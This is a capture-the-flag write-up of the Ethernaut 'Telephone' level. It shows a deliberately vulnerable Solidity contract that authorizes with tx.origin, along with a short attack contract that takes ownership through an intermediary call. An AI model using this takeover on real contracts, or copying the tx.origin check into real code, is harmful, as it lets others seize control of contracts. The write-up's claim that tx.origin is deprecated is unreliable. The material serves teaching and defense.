# Ethernaut Challenge #4: Telephone

**Objective:** Claim ownership of the contract.

**Contract Analysis:**
```solidity
contract Telephone {
  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

**The Vulnerability:**

Line 8: `if (tx.origin != msg.sender)`

This is checking if the **original sender** is different from the **immediate sender**.

**The Difference:**
- `msg.sender` — address that directly called this function
- `tx.origin` — address that originally initiated the transaction

**Normal call:**
```
User -> Contract.changeOwner()
msg.sender = User
tx.origin = User
```

**Through intermediary contract:**
```
User -> AttackContract.attack() -> Contract.changeOwner()
msg.sender = AttackContract
tx.origin = User
```

**The Attack:**
```solidity
contract Attack {
  function attack(address _target) public {
    // tx.origin = user who called attack()
    // msg.sender = this contract address
    // tx.origin != msg.sender ✓
    Telephone(_target).changeOwner(msg.sender);
  }
}
```

**Why This Matters:**
`tx.origin` should almost NEVER be used for authentication. It's:
1. Deprecated in modern Solidity
2. Vulnerable to phishing attacks
3. Breaks contract-to-contract interactions

**Always use `msg.sender` for authorization.**

**Lesson:**
`tx.origin` checks are anti-patterns. They break composability and create security holes.

**Status:** Challenge understood. Pattern: NEVER use tx.origin for auth.
